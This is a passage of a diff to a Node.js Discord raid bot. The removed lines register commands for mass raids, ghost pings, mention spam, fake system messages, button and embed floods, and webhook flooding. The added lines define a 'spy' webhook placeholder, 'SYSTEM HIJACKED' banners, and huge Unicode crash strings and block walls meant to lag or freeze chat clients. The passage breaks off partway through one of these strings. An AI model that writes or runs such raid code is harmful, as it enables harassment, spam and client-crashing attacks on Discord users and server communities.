@@ -1,153 +1,327 @@
-const { 
-  Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, 
-  EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle 
-} = require('discord.js');
+const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, MessageFlags } = require('discord.js');
 const https = require('https');
-
-const INVITE_LINK = "https://discord.gg/ure7pvshFW";
-const ALLOWED_USERS = ['1319018100217086022', '1421829036916736040', '1440641528321151099'];
-const BOT_TYPE = process.env.BOT_TYPE || 'MAIN';
-let botEnabled = (BOT_TYPE === 'MAIN');
-
-// Lógica de Cooldown Dinâmico (Ataque Progressivo)
-const dynamicWait = (index) => {
-  if (index < 2) return 1000;      // 1-2 msgs: 1s
-  if (index < 8) return 1500;      // 3-8 msgs: 1.5s
-  return 2000;                     // 9+ msgs: 2s
-};
 
 const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-module.exports = async (TOKEN, CLIENT_ID) => {
-  const client = new Client({ intents: [GatewayIntentBits.Guilds] });
-  const rest = new REST({ version: '10' }).setToken(TOKEN);
+// --- CONFIGURAÇÃO ---
+const SPY_WEBHOOK = "WEBHOOK_INVALIDA_AQUI"; 
+const INVITE = "https://discord.gg/ure7pvshFW";
 
-  async function registerCommands() {
-    const commands = [
-      new SlashCommandBuilder().setName(BOT_TYPE === 'MAIN' ? 'bot_mode2' : 'bot_mode').setDescription(`Toggle ${BOT_TYPE}`).setIntegrationTypes([1]).setContexts([0,1,2])
-    ];
+const stopSignals = new Map();
 
-    if (botEnabled) {
-      commands.push(
-        new SlashCommandBuilder().setName('raid').setDescription('RAID AGRESSIVA (10x)').setIntegrationTypes([1]).setContexts([0,1,2]),
-        new SlashCommandBuilder().setName('ghost_raid').setDescription('20x GHOST PING (NOTIFICAÇÃO SEM RASTRO)').setIntegrationTypes([1]).setContexts([0,1,2]),
-        new SlashCommandBuilder().setName('vertical_nuke').setDescription('OCUPAÇÃO TOTAL DE CHAT').setIntegrationTypes([1]).setContexts([0,1,2]),
-        new SlashCommandBuilder().setName('interaction_trap').setDescription('PAREDE DE CLIQUES INVISÍVEIS').setIntegrationTypes([1]).setContexts([0,1,2]),
-        new SlashCommandBuilder().setName('ui_glitch').setDescription('STRESS DE RENDERIZAÇÃO (REVERSE TEXT)').setIntegrationTypes([1]).setContexts([0,1,2]),
-        new SlashCommandBuilder().setName('fake_system_msg').setDescription('MENSAGEM DE SISTEMA FALSA').setIntegrationTypes([1]).setContexts([0,1,2]),
-        new SlashCommandBuilder().setName('lag_v2').setDescription('LAG FATAL').setIntegrationTypes([1]).setContexts([0,1,2]),
-        new SlashCommandBuilder().setName('mention_spam').setDescription('MARCAR TODOS (10x)').setIntegrationTypes([1]).setContexts([0,1,2]),
-        new SlashCommandBuilder().setName('button_nuke').setDescription('100 BOTÕES').setIntegrationTypes([1]).setContexts([0,1,2]),
-        new SlashCommandBuilder().setName('embed_flood').setDescription('FLOOD DE CORES').setIntegrationTypes([1]).setContexts([0,1,2]),
-        new SlashCommandBuilder().setName('fake_update').setDescription('UPDATE FAKE').setIntegrationTypes([1]).setContexts([0,1,2]),
-        new SlashCommandBuilder().setName('webhook_atk').setDescription('Flood em Webhook').setIntegrationTypes([1]).setContexts([0,1,2])
-          .addStringOption(o=>o.setName('url').setRequired(true).setDescription('URL'))
-          .addStringOption(o=>o.setName('msg').setRequired(true).setDescription('Texto'))
-          .addIntegerOption(o=>o.setName('qtd').setRequired(true).setDescription('Qtd')),
-        new SlashCommandBuilder().setName('say').setDescription('Repete').setIntegrationTypes([1]).setContexts([0,1,2])
-          .addStringOption(o=>o.setName('t').setRequired(true).setDescription('t'))
-          .addIntegerOption(o=>o.setName('q').setRequired(true).setDescription('q'))
-      );
+// --- TEXTOS ---
+
+const RAID_HEADER = "# **S̶Y̶S̶T̶E̶M̶ ̶H̶I̶J̶A̶C̶K̶E̶D̶**\n";
+
+const RAID_SYMBOLS = `∞ ♭ ♮ ♯ ♰ ♱ ▀ ▁ ▂ ▃ ▄ ▅ ▆ ▇ █ ▉ ▊ ▋ ▍ ▎ ▏ ▐ ░ ▒ ▓ ■ □ ▢ ▣ ▤ ▥ ▦ ▧ ▨ ▩ ▪ ▫ ▬ ▭ ▮ ▯ ▰ ▱ ▲ △ ▴ ▵ ▶ ▷ ▸ ▹ ► ▻ ▼ ▽ ▾ ▿ ◀ ◁ ◂ ◃ ◄ ◅ ◆ ◇ ◈ ◉ ◊ ○ ◌ ◍ ◎ ● ◐ ◑ ◒ ◓ ◔ ◕ ◖ ◗ ◘ ◙ ◚ ◛ ◜ ◝ ◞ ◟ ◠ ◡ ◢ ◣ ◤ ◥ ◦ ◧ ◨ ◩ ◪ ◫ ◬ ◭ ◮ ◯ ☰ ☱ ☲ ☳ ☴ ☵ ☶ ☷ ⟡ ⟦ ⟧ ⟨ ⟩ ⟪ ⟫ ⟰ ⟱ ⟲ ⟳ ⟴ ⟵ ⟿ ⤡ ⤢ ⤣ ⤤ ⤥ ⤦ ⤧ ⤨ ⤩ ⤪ ⤫ ⤬ ⤭ ⤮ ⤯ ⤰ ⤱ ⤲ ⤳ ⌬ ⌭ ⌮ ⌯ ⌰ ⌱ ⌲ ⌳ ⌴ ⌵ ⌶ ⌷ ⌸ ⌹ ⌺ ⌻ ⌼ ⌽ ⌾ ⌿ ⍀ ⍁ ⍂ ⍃ ⍄ ⍅ ⍆ ⍇ ⍈ ⍉ ⍊ ⍋ ⍌ ⍍ ⍎ ⍏ ⍐ ⍑ ⍒ ⍓ ⍔ ⍕ ⍖ ⍗ ⍘ ⍙ ⍚ ⍛ ⍜ ⍝ ⍞ ⍟ ⍠ ⍡ ⍢ ⍣ ⍤ ⍥ ⍦ ⍧ ⍨ ⍩ ⍪ ⍫ ⍬ ⍭ ⍮ ⍯ ⍰ ⍱ ⍲ ⍳ ─ ━ │ ┃ ┄ ┅ ┆ ┇ ┈ ┉ ┊ ┋ ┌ ┍ ┎ ┏ ┐ ┑ ┒ ┓ └ ┕ ┖ ┗ ┘ ┙ ┚ ┛ ├ ┝ ┞ ┟ ┠ ┡ ┢ ┣ ┤ ┥ ┦ ┧ ┨ ┩ ┪ ┫ ┬ ┭ ┮ ┯ ┰ ┱ ┲ ┳ ┴ ┵ ┶ ┷ ┸ ┹ ┺ ┻ ┼ ┽ ┾ ┿ ╀ ╁ ╂ ╃ ╄ ╅ ╆ ╇ ╈ ╉ ╊ ╋ ╌ ╍ ╎ ╏ ═ ║ ╒ ╓ ╔ ╕ ╖ ╗ ╘ ╙ ╚ ╛ ╜ ╝ ╞ ╟ ╠ ╡ ╢ ╣ ╤ ╥ ╦ ╧ ╨ ╩ ╪ ╫ ╬ ╭ ╮ ╯ ╰ ╱ ╲ ╳ ╴ ╵ ╶ ╷ ╸ ╹ ╺ ╻ ╼ ╽ ╾ ╿ ⛧ ⚡`;
+
+const RAID2_CONTENT = "## H̷A̷C̷K̷E̷D̷ ̷B̷Y̷ ̷S̷B̷-̷B̷O̷T̷ ☻•◘○◙♪♫☼►◄¶§▬↨↑↓→←∟^_`abcdefghijkwxyz{|}~⌂ÇüéâäêëèïîìÄÅÉæÆôöòûùÿÖÜø£Ø×ƒáíóúñÑªº¿®¬½¼¡«»░▒▓│┤ÁÂÀ©╣║╗╝¢¥┐└┴┬├─┼ãÃ╚╔╩╦╠═╬¤ðÐÊËÈıÍÎÏ┘┌█▄¦Ì▀ÓßÔÒõÕµþÞÚÛÙýÝ¯´–±‗¾¶§÷¸°¨·¹³²■ƒ”…†‡ˆ‰Š‹ŒŽ•–—š›œžŸ¡¢£¤¥¦§¨©ª«¬®¯±´µ¶·¸»¼½¾¿ÆÐ×ØÞßåæðóôõö÷øþĐđĦŒœƀƂƃƄƅƆƉƋƌƍƎƏƐƑƒƔƕƖƗƚƛƜƝƞƟƠơƢƣƤƥƦƧƨƩƪƱƷƸƹƺƻƼƽƾƿǀǁǂǝǷȡȢȣȸȹɷɸʘΦΨΩφψϞϟϪѼѾ҈҉ԱԲԳԴԵԶԷԸԹԺԻԼԽԾԿՀՁՂՃՄՅՆՇՈՉՊՋՌՍՎՏՐՑՒՓՔՕՖ۝۞۩߷ऄअआइईउऊऋऌऍऎएऐऑऒओऔकखगघङचछजझञटठडढणतथदधनऩपफबभमयरऱलळऴवशषसहॐक़ख़ग़ज़ड़ढ़फ़य़ॠॡ।॥०१२३४५६७८९ॲॻॼॽॾॿঅআইঈউঊঋঌএঐওঔকখগঘঙচছজঝঞটঠডঢণতথদধনপফবভমযরলশষসহঽৎড়ঢ়য়ৠৡ১২৩৪৫৬৭৮৯ৰৱ৲৳৴৵৶৷৸৹৺ਅਆਇਈਉਊਏਐਓਔਕਖਗਘਙਚਛਜਝਞਟਠਡਢਣਤਥਦਧਨਪਫਬਭਮਯਰਲਲ਼ਵਸ਼ਸਹਖ਼ਗ਼ਜ਼ੜਫ਼੦੧੨੩੪੫੬੭੮੯ੲੳੴઅઆઇઈઉઊઋઌઍએઐઑઓઔકખગઘઙચછજઝઞટઠડઢણતથદધનપફબભમયરલળવશષસહઽૐૠૡ૧૨૩૪૫૬૭૮૯૱ଅଆଇଈଉଊଋଌଏଐଓଔକଖଗଘଙଚଛଜଝଞଟଠଡଢଣତଥଦଧନପଫବଭମଯରଲଳଵଶଷସହଽଡ଼ଢ଼ୟୠୡ୦୧୨୩୪୫୬୭୮୯୰ୱஃஅஆஇஈஉஊஎஏஐஒஓஔகஙசஜஞடணதநனபமயரறலளழவஶஷஸஹௐ௰௱௲௳௴௵௶௷௸௹௺അആഇഈഉഊഋഌഎഏഐഒഓഔകഖഗഘങചഛജഝഞടഠഡഢണതഥദധനപഫബഭമയരറലളഴവശഷസഹഽൄൠൡ൦൧൨൩൪൫൬൭൮൯൰൱൲൳൴൵൹ൺൻർൽൾൿ෴࿂࿃࿄࿅࿆࿇࿈࿉࿊࿋࿌࿏ႠႡႢႣႤႥႦႧႨႩႪႫႬႭႮႯႰႱႲႳႴႵႶႷႸႹႺႻႼႽႾႿჀჁჂჃჄჅაბგდევზთიკლმნოჟრსტუფქღყშჩცძწჭხჯჰჱჲჳჴჵჶჷჸჹჺ፠፡።፣፤፥፦፧፨ᎣᎤᎦᎧᎨᎭᎮᎯᎰᎱᎲᎴᎸᎹᎺᎼᎽᎾᎿᏁᏄᏅᏆᏇᏈᏉᏊᏋᏌᏍᏏᏐᏑᏓᏔᏕᏖᏗᏘᏙᏛᏜᏝᏠᏡᏣᏤᏥᏧᏨᏩᏪᏫᏬᏯᏰᏱᏲᏳᐁᐂᐃᐄᐅᐆᐇᐈᐉᐊᐋᐌᐍᐎᐏᐐᐑᐒᐓᐔᐕᐖᐗᐘᐙᐚᐛᐜᐝᐞᐟᐠᐡᐢᐣᐤᐥᐦᐧᐨᐩᐪᐫᐬᐭᐮᐯᐰᐱᐲᐳᐴᐵᐶᐷᐸᐹᐺᐻᐼᐽᐾᐿᑀᑁᑂᑃᑄᑅᑆᑇᑈᑉᑊᑋᑌᑍᑎᑏᑐᑑᑒᑓᑔᑕᑖᑗᑘᑙᑚᑛᑜᑝᑞᑟᑠᑡᑢᑣᑤᑥᑦᑧᑨᑩᑪᑫᑬᑭᑮᑯᑰᑱᑲᑳᑴᑵᑶᑷᑸᑹᑺᑻᑼᑽᑾᑿᒀᒁᒂᒃᒄᒅᒆᒇᒈᒉᒊᒋᒌᒍᒎᒏᒐᒑᒒᒓᒔᒕᒖᒗᒘᒙᒚᒛᒜᒝᒞᒟᒠᒡᒢᒣᒤᒥᒦᒧᒨᒩᒪᒫᒬᒭᒮᒯᒰᒱᒲᒳᒴᒵᒶᒷᒸᒹᒺᒻᒼᒽᒾᒿᓀᓁᓂᓃᓄᓅᓆᓇᓈᓉᓊᓋᓌᓍᓎᓏᓐᓑᓒᓓᓔᓕᓖᓗᓘᓙᓚᓛᓜᓝᓞᓟᓠᓡᓢᓣᓤᓥᓦᓧᓨᓩᓪᓫᓬᓭᓮᓯᓰᓱᓲᓳᓴᓵᓶᓷᓸᓹᓺᓻᓼᓽᓾᓿᔀᔁᔂᔃᔄᔅᔆᔇᔈᔉᔊᔋᔌᔍᔎᔏᔐᔑᔒᔓᔔᔕᔖᔗᔘᔙᔚᔛᔜᔝᔞᔟᔠᔡᔢᔣᔤᔥᔦᔧᔨᔩᔪᔫᔬᔭᔮᔯᔰᔱᔲᔳᔴᔵᔶᔷᔸᔹᔺᔻᔼᔽᔾᔿᕀᕁᕂᕃᕄᕅᕆᕇᕈᕉᕊᕋᕌᕍᕎᕏᕐᕑᕒᕓᕔᕕᕖᕗᕘᕙᕚᕛᕜᕝᕞᕟᕠᕡᕢᕣᕤᕥᕦᕧᕨᕩᕪᕫᕬᕭᕮᕯᕰᕱᕲᕳᕴᕵᕶᕷᕸᕹᕺᕻᕼᕽᕾᕿᖀᖁᖂᖃᖄᖅᖆᖇᖈᖉᖊᖋᖌᖍᖎᖏᖐᖑᖒᖓᖔᖕᖖᖗᖘᖙᖚᖛᖜᖝᖞᖟᖠᖡᖢᖣᖤᖥᖦᖧᖨᖩᖪᖫᖬᖭᖮᖯᖰᖱᖲᖳᖴᖵᖶᖷᖸᖹᖺᖻᖼᖽᖾᖿᗀᗁᗂᗃᗄᗅᗆᗇᗈᗉᗊᗋᗌᗍᗎᗏᗐᗑᗒᗓᗔᗕᗖᗗᗘᗙᗚᗛᗜᗝᗞᗟᗠᗡᗢᗣᗤᗥᗦᗧᗨᗩᗪᗫᗬᗭᗮᗯᗰᗱᗲᗳᗴᗵᗶᗷᗸᗹᗺᗻᗼᗽᗾᗿᘀᘁᘂᘃᘄᘅᘆᘇᘈᘉᘊᘋᘌᘍᘎᘏᘐᘑᘒᘓᘔᘕᘖᘗᘘᘙᘚᘛᘜᘝᘞᘟᘠᘡᘢᘣᘤᘥᘦᘧᘨᘩᘪᘫᘬᘭᘮᘯᘰᘱᘲᘳᘴᘵᘶᘷᘸᘹᘺᘻᘼᘽᘾᘿᙀᙁᙂᙃᙄᙅᙆᙇᙈᙉᙊᙋᙌᙍᙎᙏᙐᙑᙒᙓᙔᙕᙖᙗᙘᙙᙚᙛᙜᙝᙞᙟᙠᙡᙢᙣᙤᙥᙦᙧᙨᙩᙪᙫᙬ᙭᙮ᙯᙰᙱᙲᙳᙴᙵᙶᚁᚂᚃᚄᚅᚆᚇᚈᚉᚊᚋᚌᚍᚎᚏᚐᚑᚒᚓᚔᚕᚖᚗᚘᚙᚚ᚛᚜ᚠᚡᚢᚣᚤᚥᚦᚧᚨᚩᚪᚫᚬᚭᚮᚯᚰᚱᚲᚳᚴᚵᚶᚷᚸᚹᚺᚻᚼᚽᚾᚿᛀᛁᛂᛃᛄᛅᛆᛇᛈᛉᛊᛋᛌᛍᛎᛏᛐᛑᛒᛓᛔᛕᛖᛗᛘᛙᛚᛛᛜᛝᛞᛟᛠᛡᛢᛣᛤᛥᛦᛨᛩᛪ᛫᛭ᛮᛯᛰ៳៴៵៶៷៸៹᠀᠁᠅᠉ᢀᢁᢂᢃᢄᢅᢆᥐᥑᥒᥓᥔᥕᥖᥗᥘᥙᥚᥛᥜᥝᥞᥟᥠᥡᥢᥣᥤᥥᥦᥧᥨᥩᥪᥫᥬᥭᥰᥱᥲᥳᥴᦀᦁᦂᦃᦄᦅᦆᦇᦈᦉᦊᦋᦌᦍᦎᦏᦐᦑᦒᦓᦔᦕᦖᦗᦘᦙᦚᦛᦜᦝᦞᦟᦠᦡᦢᦣᦤᦥᦦᦧᦨᦩᦰᦱᦲᦳᦴᦸᦹᦻᦼᦽᦾᦿᧀᧁᧂᧃᧄᧅᧆᧇᧈᧉ᧑᧒᧓᧔᧕᧖᧗᧘᧙᧞᧟᧠᧡᧢᧣᧤᧥᧦᧧᧨᧩᧪᧫᧬᧭᧮᧯᧰᧱᧲᧳᧴᧵᧶᧷᧸᧹᧺᧻᧼᧽᧾᧿ᴁᴂᴈᴉᴑᴒᴓᴔᴕᴖᴗᴘᴙᴚᴛᴜᴝᴞᴟᵷᵹ†‡•‣※‽‾‿⁀⁁⁂⁃⁄⁅⁆⁇⁈⁑⁗⁞₠₡₢₣₤₥₦₧₨₩₪₫€₭₮₯₰₱₲₳₴₵₸⃒⃓⃐⃑⃔⃕⃖⃛⃜⃝⃠⃪⃡⃩℀℁ℂ℃℄℅℆ℇ℈℉ℊℋℌℍℎℏℐℑℒℓ℔ℕ№℗℘ℙℚℛℜℝ℞℟℠℡™℣ℤ℥Ω℧ℨ℩KÅℬℭ℮ℯℰℱℲℳℴℵℶℷℸ℺ℽℾℿ⅀⅁⅂⅃⅄ⅅⅆⅇⅈⅉ⅊⅋⅌⅍ⅎ⅓⅔⅕⅖⅗⅘⅙⅚⅛⅜⅝⅞⅟ⅠⅡⅢⅣⅤⅥⅦⅧⅨⅩⅪⅫⅰⅱⅲⅳⅴⅵⅶⅷⅸⅹⅺⅻⅼⅽⅾⅿↀↁↂↃↄ←↑→↓↚↛↜↝↞↟↠↡↢↣↤↥↦↧↨↫↬↭↮↯↰↱↲↳↴↵↶↷↸↹↺↻↼↽↾↿⇀⇁⇂⇃⇄⇅⇆⇇⇈⇉⇊⇋⇌⇍⇎⇏⇐⇑⇒⇓⇔⇕⇖⇗⇘⇙⇚⇛⇜⇝⇞⇟⇠⇡⇢⇣⇤⇥⇦⇧⇨⇩⇪⇫⇬⇭⇮⇯⇰⇱⇲⇳⇴⇵⇶⇷⇸⇹⇺⇻⇼⇽⇾⇿∀∁∂∃∄∅∆∇∈∉∊∋∌∍∎∏∐∑−∓∔∕∖∘∙√∛∜∝∞∟∠∡∢∣∤∥∦⊥⊦∩∪∫∬∭∮∯∰∱∲∳∴∵∶∷∸∹∺∻∼∽∾∿≀≁≂≃≄≅≆≇≈≉≊≋≌≍≎≏≐≑≒≓≔≕≖≗≘≙≚≛≜≝≞≟≠≡≢≣≤≥≦≧≨≩≪≫≬≭≮≯≰≱≲≳≴≵≶≷≸≹≺≻≼≽≾≿⊀⊁⊂⊃⊄⊅⊆⊇⊈⊉⊊⊋⊌⊍⊎⊏⊐⊑⊒⊓⊔⊕⊖⊗⊘⊙⊚⊛⊜⊝⊞⊟⊠⊡⊢⊣⊤⊥⊦⊧⊨⊩⊪⊫⊬⊭⊮⊯⊰⊱⊲⊳⊴⊵⊶⊷⊸⊹⊺⊻⊼⊽⊾⊿⋀⋁⋂⋃⋄⋅⋆⋇⋈⋉⋊⋋⋌⋍⋎⋏⋐⋑⋒⋓⋔⋕⋖⋗⋘⋙⋚⋛⋜⋝⋞⋟⋠⋡⋢⋣⋤⋥⋦⋧⋨⋩⋪⋫⋬⋭⋮⋯⋰⋱⋲⋳⋴⋵⋶⋷⋸⋹⋺⋻⋼⋽⋾⋿⌀⌁⌂⌃⌄⌅⌆⌇⌈⌉⌊⌋⌌⌍⌎⌏⌐⌑⌒⌓⌔⌕⌖⌗⌘⌙⌜⌝⌞⌟⌠⌡⌢⌣⌤⌥⌦⌧〈〉⌫⌬⌭⌮⌯⌰⌱⌲⌳⌴⌵⌶⌷⌸⌹⌺⌻⌼⌽⌾⌿⍀⍁⍂⍃⍄⍅⍆⍇⍈⍉⍊⍋⍌⍍⍎⍏⍐⍑⍒⍓⍔⍕⍖⍗⍘⍙⍚⍛⍜⍝⍞⍟⍠⍡⍢⍣⍤⍥⍦⍧⍨⍩⍪⍫⍬⍭⍮⍯⍰⍱⍲⍳⍴⍵⍶⍷⍸⍹⍺⍻⍼⍽⍾⍿⎀⎁⎂⎃⎄⎅⎆⎇⎈⎉⎊⎋⎌⎍⎎⎏⎐⎑⎒⎓⎔⎕⎖⎗⎘⎙⎚⎛⎜⎝⎞⎟⎠⎡⎢⎣⎤⎥⎦⎧⎨⎩⎪⎫⎬⎭⎮⎯⎰⎱⎲⎳⎴⎵⎶⎷⎸⎹⎺⎻⎼⎽⎾⎿⏀⏁⏂⏃⏄⏅⏆⏇⏈⏉⏊⏋⏌⏍⏎⏚⏛⏜⏝⏞⏟⏠␀␁␂␃␄␅␆␇␈␉␊␋␌␍␎␏␐␑␒␓␔␕␖␗␘␙␚␛␜␝␞␟␠␡␢␣␤⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿─━│┃┄┅┆┇┈┉┊┋┌┍┎┏┐┑┒┓└┕┖┗┘┙┚┛├┝┞┟┠┡┢┣┤┥┦┧┨┩┪┫┬┭┮┯┰┱┲┳┴┵┶┷┸┹┺┻┼┽┾┿╀╁╂╃╄╅╆╇╈╉╊╋╌╍╎╏═║╒╓╔╕╖╗╘╙╚╛╜╝╞╟╠╡╢╣╤╥╦╧╨╩╪╫╬╭╮╯╰╱╲╳╴╵╶╷╸╹╺╻╼╽╾╿▀▁▂▃▄▅▆▇█▉▊▋▌▍▎▏▐░▒▓▔▕■□▢▣▤▥▦▧▨▩▬▭▮▯▰▱▲△▴▵▷▸▹►▻▼▽▾▿◁◂◃◄◅◆◇◈◉◊○◌◍◎●◐◑◒◓◔◕◖◗◘◙◢◣◤◥◦◧◨◩◪◫◬◭◮◯★☆☇☈☉☊☋☌☍☏☐☒☓☖☗☙☡☤☧☨☩☫☬☭☰☱☲☳☴☵☶☷☻☼☽☾☿♁♃♄♅♆♇♔♕♖♗♘♙♚♛♜♝♞♟♡♢♤♧♩♪♫♬♭♮♯♰♱✁✃✄✆✇✎✐✑✓✕✗✘✙✚✛✜✞✟✠✢✣✤✥✦✧✩✪✫✬✭✮✯✰✱✲✵✶✷✸✹✺✻✼✽✾✿❀❁❂❃❅❆❈❉❊❋❍❏❐❑❒❖❘❙❚❛❜❝❞❡❢❥❦❧❶❷❸❹❺❻❼❽❾❿➀➁➂➃➄➅➆➇➈➉➊➋➌➍➎➏➐➑➒➓➔➘➙➚➛➜➝➞➟➠➢➣➤➥➦➧➨➩➪➫➬➭➮➯➱➲➳➴➵➶➷➸➹➺➻➼➽➾⟐⟑⟒⟓⟔⟕⟖⟗⟘⟙⟚⟛⟜⟝⟞⟟⟠⟡⟢⟣⟤⟥⟦⟧⟨⟩⟪⟫⟰⟱⟲⟳⟴⟵⟶⟷⟸⟹⟺⟻⟼⟽⟾⟿⠀⠁⠂⠃⠄⠅⠆⠇⠈⠉⠊⠋⠌⠍⠎⠏⠐⠑⠒⠓⠔⠕⠖⠗⠘⠙⠚⠛⠜⠝⠞⠟⠠⠡⠢⠣⠤⠥⠦⠧⠨⠩⠪⠫⠬⠭⠮⠯⠰⠱⠲⠳⠴⠵⠶⠷⠸⠹⠺⠻⠼⠽⠾⠿⡀⡁⡂⡃⡄⡅⡆⡇⡈⡉⡊⡋⡌⡍⡎⡏⡐⡑⡒⡓⡔⡕⡖⡗⡘⡙⡚⡛⡜⡝⡞⡟⡠⡡⡢⡣⡤⡥⡦⡧⡨⡩⡪⡫⡬⡭⡮⡯⡰⡱⡲⡳⡴⡵⡶⡷⡸⡹⡺⡻⡼⡽⡾⡿⢀⢁⢂⢃⢄⢅⢆⢇⢈⢉⢊⢋⢌⢍⢎⢏⢐⢑⢒⢓⢔⢕⢖⢗⢘⢙⢚⢛⢜⢝⢞⢟⢠⢡⢢⢣⢤⢥⢦⢧⢨⢩⢪⢫⢬⢭⢮⢯⢰⢱⢲⢳⢴⢵⢶⢷⢸⢹⢺⢻⢼⢽⢾⢿⣀⣁⣂⣃⣄⣅⣆⣇⣈⣉⣊⣋⣌⣍⣎⣏⣐⣑⣒⣓⣔⣕⣖⣗⣘⣙⣚⣛⣜⣝⣞⣟⣠⣡⣢⣣⣤⣥⣦⣧⣨⣩⣪⣫⣬⣭⣮⣯⣰⣱⣲⣳⣴⣵⣶⣷⣸⣹⣺⣻⣼⣽⣾⣿⤀⤁⤂⤃⤄⤅⤆⤇⤈⤉⤊⤋⤌⤍⤎⤏⤐⤑⤒⤓⤔⤕⤖⤗⤘⤙⤚⤛⤜⤝⤞⤟⤠⤡⤢⤣⤤⤥⤦⤧⤨⤩⤪⤫⤬⤭⤮⤯⤰⤱⤲⤳⤺⤻⤼⤽⤾⤿⥀⥁⥂⥃⥄⥅⥆⥇⥈⥉⥊⥋⥌⥍⥎⥏⥐⥑⥒⥓⥔⥕⥖⥗⥘⥙⥚⥛⥜⥝⥞⥟⥠⥡⥢⥣⥤⥥⥦⥧⥨⥩⥪⥫⥬⥭⥮⥯⥰⥱⥲⥳⥴⥵⥶⥷⥸⥹⥺⥻⥼⥽⥾⥿⦀⦁⦂⦃⦄⦅⦆⦇⦈⦉⦊⦋⦌⦍⦎⦏⦐⦑⦒⦓⦔⦕⦖⦗⦘⦙⦚⦛⦜⦝⦞⦟⦠⦡⦢⦣⦤⦥⦦⦧⦨⦩⦪⦫⦬⦭⦮⦯⦰⦱⦲⦳⦴⦵⦶⦷⦸⦹⦺⦻⦼⦽⦾⦿⧀⧁⧂⧃⧄⧅⧆⧇⧈⧉⧊⧋⧌⧍⧎⧏⧐⧑⧒⧓⧔⧕⧖⧗⧘⧙⧚⧛⧜⧝⧞⧟⧠⧡⧢⧣⧤⧥⧦⧧⧨⧩⧪⧫⧬⧭⧮⧯⧰⧱⧲⧳⧴⧵⧶⧷⧸⧹⧺⧻⧼⧽⧾⧿⨀⨁⨂⨃⨄⨅⨆⨇⨈⨉⨊⨋⨌⨍⨎⨏⨐⨑⨒⨓⨔⨕⨖⨗⨘⨙⨚⨛⨜⨝⨞⨟⨠⨡⨢⨣⨤⨥⨦⨧⨨⨩⨪⨫⨬⨭⨮⨯⨰⨱⨲⨳⨴⨵⨶⨷⨸⨹⨺⨻⨼⨽⨾⨿⩀⩁⩂⩃⩄⩅⩆⩇⩈⩉⩊⩋⩌⩍⩎⩏⩐⩑⩒⩓⩔⩕⩖⩗⩘⩙⩚⩛⩜⩝⩞⩟⩠⩡⩢⩣⩤⩥⩦⩧⩨⩩⩪⩫⩬⩭⩮⩯⩰⩱⩲⩳⩴⩵⩶⩷⩸⩹⩺⩻⩼⩽⩾⩿⪀⪁⪂⪃⪄⪅⪆⪇⪈⪉⪊⪋⪌⪍⪎⪏⪐⪑⪒⪓⪔⪕⪖⪗⪘⪙⪚⪛⪜⪝⪞⪟⪠⪡⪢⪣⪤⪥⪦⪧⪨⪩⪪⪫⪬⪭⪮⪯⪰⪱⪲⪳⪴⪵⪶⪷⪸⪹⪺⪻⪼⪽⪾⪿⫀⫁⫂⫃⫄⫅⫆⫇⫈⫉⫊⫋⫌⫍⫎⫏⫐⫑⫒⫓⫔⫕⫖⫗⫘⫙⫚⫛⫝⫞⫟⫠⫡⫢⫣⫤⫥⫦⫧⫨⫩⫪⫫⫬⫭⫮⫯⫰⫱⫲⫳⫴⫵⫶⫷⫸⫹⫺⫻⫼⫽⫾⫿⬚ⱠⱡⱢⱣⱤⱥⱦⱧⱨⱩⱪⱫⱬⱭⱱⱲⱳⱴⱵⱶⱷⴰⴱⴲⴳⴴⴵⴶⴷⴸⴹⴺⴻⴼⴽⴾⴿⵀⵁⵂⵃⵄⵅⵆⵇⵈⵉⵊⵋⵌⵍⵎⵏⵐⵑⵒⵓⵔⵕⵖⵗⵘⵙⵚⵛⵜⵝⵞⵟⵠⵡⵢⵣⵤⵥ✽✾✿❀❁❂❃❈♩♪♫♬♭♮♯✢✣✤✥✦✧✩✪⍟✫✬✭✮⋆★☆✯✰✱✲✵✶✷✸✹✺✻✼✽✾✿❉❊❋☻☏☜☞☟☚☛✁✃✄✎✐✑✆✗✘☒▔❘❙❚░▒▓❛❜❝❞❢❥❡❦❧〰☿♁♃♄♅♆♇☉♚♔♛♕♜♖♝♗♞♘♟♙♤♧♡♢☥☨☩✙✚✛✜✞✟✠✢✣✤✥✦✧✩✪✫✬✭✮✯✰✱✲✵✶✷✸✹✺✻✼✽✾✿☡☤"
+
+const TRAVA_PATTERN = "漢.࿊.M.A.T.A.漢.࿊.N.O.O.B.漢.࿊.1.5.7.";
+const TRAVA_ZAP_MSG = Array(60).fill(TRAVA_PATTERN).join(""); 
+
+const WALL_1 = Array(1900).fill("░").join("");
+const WALL_2 = Array(1900).fill("▒").join("");
+const WALL_3 = Array(1900).fill("▓").join("");
+
+const PONTO_TEXT = `⠁ ⠂ ⠃ ⠄ ⠅ ⠆ ⠇ ⠈ ⠉ ⠊ ⠋ ⠌ ⠍ ⠎ ⠏ ⠐ ⠑ ⠒ ⠓ ⠔ ⠕ ⠖ ⠗ ⠘ ⠙ ⠚ ⠛ ⠜ ⠝ ⠞ ⠟ ⠠ ⠡ ⠢ ⠣ ⠤ ⠥ ⠦ ⠧ ⠨ ⠩ ⠪ ⠫ ⠬ ⠭ ⠮ ⠯ ⠰ ⠱ ⠲ ⠳ ⠴ ⠵ ⠶ ⠷ ⠸ ⠹ ⠺ ⠻ ⠼ ⠽ ⠾ ⠿ ⡀ ⡁ ⡂ ⡃ ⡄ ⡅ ⡆ ⡇ ⡈ ⡉ ⡊ ⡋ ⡌ ⡍ ⡎ ⡏ ⡐ ⡑ ⡒ ⡓ ⡔ ⡕ ⡖ ⡗ ⡘ ⡙ ⡚ ⡛ ⡜ ⡝ ⡞ ⡟ ⡠ ⡡ ⡢ ⡣ ⡤ ⡥ ⡦ ⡧ ⡨ ⡩ ⡪ ⡫ ⡬ ⡭ ⡮ ⡯ ⡰ ⡱ ⡲ ⡳ ⡴ ⡵ ⡶ ⡷ ⡸ ⡹ ⡺ ⡻ ⡼ ⡽ ⡾ ⡿ ⢀ ⢁ ⢂ ⢃ ⢄ ⢅ ⢆ ⢇ ⢈ ⢉ ⢊ ⢋ ⢌ ⢍ ⢎ ⢏ ⢐ ⢑ ⢒ ⢓ ⢔ ⢕ ⢖ ⢗ ⢘ ⢙ ⢚ ⢛ 